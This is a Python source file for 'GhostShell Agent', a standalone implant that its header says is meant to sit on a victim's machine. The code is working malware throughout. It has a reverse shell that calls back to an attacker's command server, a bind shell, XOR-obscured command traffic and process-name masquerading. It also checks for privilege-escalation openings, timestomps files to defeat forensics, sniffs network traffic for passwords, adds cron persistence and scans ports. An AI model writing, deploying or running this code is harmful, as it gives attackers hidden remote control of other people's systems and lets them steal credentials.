"""
GhostShell Agent - Standalone Payload
NO EXTERNAL DEPENDENCIES (Standard Library Only)

Acest fisier este singurul necesar pe masina victima.
"""

import sys
import socket
import subprocess
import os
import threading
import platform
import time
import argparse
import struct
import hashlib
import ctypes
from datetime import datetime

# --- CONFIGURATION ---
VERSION = "3.0-Standalone"
DEFAULT_PORT = 4444
XOR_KEY = b"GHOST" 

# --- UTILITIES ---

def get_username():
    """Robustly retrieve username."""
    try:
        return os.getlogin()
    except Exception:
        pass
    return os.environ.get('USER') or os.environ.get('USERNAME') or "unknown"

def xor_cipher(data):
    """Stateless XOR encryption."""
    if not data: return b""
    return bytes([b ^ XOR_KEY[i % len(XOR_KEY)] for i, b in enumerate(data)])

def set_proc_name(name):
    """
    Change process name using ctypes (Linux only).
    Replaces 'setproctitle' external dependency.
    """
    print(f"[*] Attempting to mask process as: {name}")
    try:
        libc = ctypes.CDLL('libc.so.6')
        # PR_SET_NAME = 15
        s_name = name.encode('utf-8')[:15] # Linux limit is usually 15 chars + null
        libc.prctl(15, s_name, 0, 0, 0)
    except Exception as e:
        print(f"[!] Could not rename process via prctl: {e}")

def execute_command(cmd):
    """Executes system commands."""
    cmd = cmd.strip()
    if not cmd: return b""
    
    if cmd.startswith("cd "):
        try:
            target_dir = cmd[3:].strip()
            os.chdir(target_dir)
            return f"Changed directory to {os.getcwd()}".encode()
        except Exception as e:
            return str(e).encode()
            
    try:
        # Use shell=True for flexibility
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    except Exception as e:
        output = str(e).encode()
    return output

# --- MODULES ---

def reverse_shell(ip, port):
    """Initiates reverse shell to attacker's C2 server."""
    while True:
        print(f"[*] Connecting to {ip}:{port}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((ip, port))
            s.settimeout(None)
            print("[+] Connected!")
            
            # Handshake
            user = get_username()
            s.send(f"HELLO_GHOST_V2:{user}@{socket.gethostname()}\n".encode())
            
            while True:
                data = s.recv(4096)
                if not data: break
                
                # Decrypt
                try:
                    decoded = xor_cipher(data)
                    cmd = decoded.decode(errors='ignore').strip()
                except Exception as e:
                    print(f"Decrypt Error: {e}")
                    continue

                if cmd.lower() in ['exit', 'quit']:
                    s.close()
                    return

                # Execute
                output = execute_command(cmd)
                
                # Encrypt Response
                s.send(xor_cipher(output + b"\nMARKER")) 
                
            s.close()
        except KeyboardInterrupt:
            print("\n[!] Stopped by user.")
            break
        except Exception as e:
            print(f"[!] Error: {e}. Retry in 5s...")
            time.sleep(5)

def bind_shell(port):
    """Listens for incoming connections."""
    server = None
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", port))
        server.listen(1)
        print(f"[*] Bind Shell Listening on {port}...")
        
        while True:
            client, addr = server.accept()
            print(f"[+] Client connected: {addr}")
            
            client.send(b"GHOST_BIND_V2_READY\n")
            
            while True:
                data = client.recv(4096)
                if not data: break
                
                decoded = xor_cipher(data)
                cmd = decoded.decode(errors='ignore').strip()
                
                if cmd.lower() in ['exit', 'quit']: break
                
                output = execute_command(cmd)
                client.send(xor_cipher(output + b"\nMARKER"))
            
            client.close()
            print("[*] Client disconnected. Waiting...")
            
    except KeyboardInterrupt:
        print("\nExit.")
    except Exception as e:
        print(f"[!] Bind Shell Error: {e}")
    finally:
        if server: server.close()

def audit_system():
    """Privilege escalation audit."""
    print("\n=== PRIVILEGE ESCALATION AUDIT ===")
    print(f"[*] User: {get_username()} (UID: {os.getuid() if hasattr(os, 'getuid') else '?'})")
    
    # Kernel
    kernel = platform.release()
    print(f"[*] Kernel: {kernel}")
    if any(v in kernel for v in ["5.8", "5.10", "5.11", "5.12", "5.13", "5.14", "5.15"]):
        print("    [!] POTENTIAL: Dirty Pipe (CVE-2022-0847) range detected.")

    # SUID
    print("\n[*] Dangerous SUID Binaries (Sample):")
    dangerous_bins = ["nmap", "vim", "find", "bash", "more", "less", "nano", "cp", "python"]
    try:
        cmd = "find /usr/bin /bin -perm -4000 -type f 2>/dev/null"
        suid_files = subprocess.check_output(cmd, shell=True).decode().splitlines()
        for f in suid_files:
            if os.path.basename(f) in dangerous_bins:
                print(f"    [!] GTFOBins Vector: {f}")
    except:
        print("    [-] SUID check skipped or failed.")

    print("\n=== AUDIT COMPLETE ===")

def timestomp(target, ref_file=None, date_str=None):
    """Modify file timestamps."""
    if not os.path.exists(target):
        print(f"[!] Target file {target} not found.")
        return

    try:
        if date_str:
            # Manual date
            try:
                dt_obj = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
            except ValueError:
                dt_obj = datetime.strptime(date_str, "%Y-%m-%d")
            
            timestamp = dt_obj.timestamp()
            os.utime(target, (timestamp, timestamp))
            print(f"[+] Stomped {target} with date: {date_str}")
        
        elif ref_file:
            # Clone from reference
            if not os.path.exists(ref_file):
                print(f"[!] Ref file {ref_file} not found.")
                return
            st = os.stat(ref_file)
            os.utime(target, (st.st_atime, st.st_mtime))
            print(f"[+] Stomped {target} to match {ref_file}")
            
    except Exception as e:
        print(f"[!] Timestomp failed: {e}")

def sniff_packets(interface, count=0):
    """
    Raw Socket Sniffer.
    Requires ROOT (or CAP_NET_RAW).
    """
    print(f"[*] Starting Sniffer on {interface}...")
    if platform.system() != "Linux":
        print("[!] Sniffer only works on Linux.")
        return

    try:
        # ntohs(3) = ETH_P_ALL
        conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
        conn.bind((interface, 0))
    except PermissionError:
        print("[!] Error: Root privileges required for raw sockets.")
        return
    except Exception as e:
        print(f"[!] Error creating socket: {e}")
        return

    captured = 0
    try:
        while True:
            if count > 0 and captured >= count: break
                
            raw_data, _ = conn.recvfrom(65535)
            
            # Ethernet Header (14 bytes)
            eth_proto = struct.unpack('! 6s 6s H', raw_data[:14])[2]
            
            # IP Protocol (0x0800)
            if socket.ntohs(eth_proto) == 8:
                ip_header = raw_data[14:34]
                iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
                protocol = iph[6]
                
                # TCP Protocol (6)
                if protocol == 6:
                    version_ihl = iph[0]
                    ihl = version_ihl & 0xF
                    iph_length = ihl * 4
                    
                    tcp_start = 14 + iph_length
                    tcp_header = raw_data[tcp_start : tcp_start+20]
                    tcph = struct.unpack('!HHLLBBHHH', tcp_header)
                    
                    src_port = tcph[0]
                    dest_port = tcph[1]
                    
                    doff_reserved = tcph[4]
                    tcph_length = (doff_reserved >> 4) * 4
                    
                    header_size = 14 + iph_length + tcph_length
                    payload = raw_data[header_size:]
                    
                    try:
                        decoded = payload.decode('utf-8', errors='ignore')
                        # Simple keyword search
                        if any(k in decoded.upper() for k in ["USER", "PASS", "LOGIN", "Authorization"]):
                            print(f"\n[!] CREDENTIAL CANDIDATE ({src_port}->{dest_port}):")
                            print(decoded.strip()[:200]) # Print first 200 chars
                            captured += 1
                    except:
                        pass
    except KeyboardInterrupt:
        print("\n[*] Sniffer stopped.")

def persist(method, payload=None):
    """Simple persistence via Cron."""
    if method == 'cron':
        cmd = payload if payload else f"{sys.executable} {os.path.abspath(sys.argv[0])} connect 127.0.0.1"
        entry = f"@reboot {cmd} >/dev/null 2>&1\n"
        
        try:
            print(f"[*] Adding to crontab: {entry.strip()}")
            os.system(f'(crontab -l 2>/dev/null; echo "{entry.strip()}") | crontab -')
            print("[+] Persistence added.")
        except Exception as e:
            print(f"[!] Persistence failed: {e}")
    else:
        print("[!] Only 'cron' method supported in standalone agent.")

def scanner(target, ports_str):
    """Simple Port Scanner."""
    print(f"[*] Scanning {target} on ports {ports_str}...")
    try:
        start, end = map(int, ports_str.split('-'))
        target_ip = socket.gethostbyname(target)
    except:
        print("[!] Invalid format. Use: 1-100")
        return

    for port in range(start, end + 1):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((target_ip, port)) == 0:
                print(f"    [+] Port {port} OPEN")
            s.close()
        except KeyboardInterrupt:
            break
        except:
            pass

# --- MAIN ENTRY ---

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GhostShell Agent (Standalone)")
    subparsers = parser.add_subparsers(dest="command", required=True)
    
    # 1. Connect (Reverse Shell)
    rev = subparsers.add_parser("connect")
    rev.add_argument("ip")
    rev.add_argument("--port", type=int, default=4444)
    rev.add_argument("--name", help="Masquerade process name")
    
    # 2. Listen (Bind Shell)
    bind = subparsers.add_parser("listen")
    bind.add_argument("--port", type=int, default=4444)
    bind.add_argument("--name", help="Masquerade process name")

    # 3. Audit
    subparsers.add_parser("audit")

    # 4. Sniff
    sniff_p = subparsers.add_parser("sniff")
    sniff_p.add_argument("--interface", default="eth0")
    sniff_p.add_argument("--count", type=int, default=0)
    
    # 5. Timestomp
    tstomp = subparsers.add_parser("timestomp")
    tstomp.add_argument("target")
    tstomp.add_argument("--ref", default="/bin/bash")
    tstomp.add_argument("--date", help="YYYY-MM-DD")

    # 6. Persist
    pers = subparsers.add_parser("persist")
    pers.add_argument("--method", default="cron")
    pers.add_argument("--payload", help="Command to run @reboot")
    
    # 7. Scan
    scan = subparsers.add_parser("scan")
    scan.add_argument("target")
    scan.add_argument("--ports", default="1-1000")

    args = parser.parse_args()
    
    # Apply Masquerade if requested
    if hasattr(args, 'name') and args.name:
        set_proc_name(args.name)

    if args.command == "connect":
        reverse_shell(args.ip, args.port)
    elif args.command == "listen":
        bind_shell(args.port)
    elif args.command == "audit":
        audit_system()
    elif args.command == "sniff":
        sniff_packets(args.interface, args.count)
    elif args.command == "timestomp":
        timestomp(args.target, args.ref, args.date)
    elif args.command == "persist":
        persist(args.method, args.payload)
    elif args.command == "scan":
        scanner(args.target, args.ports)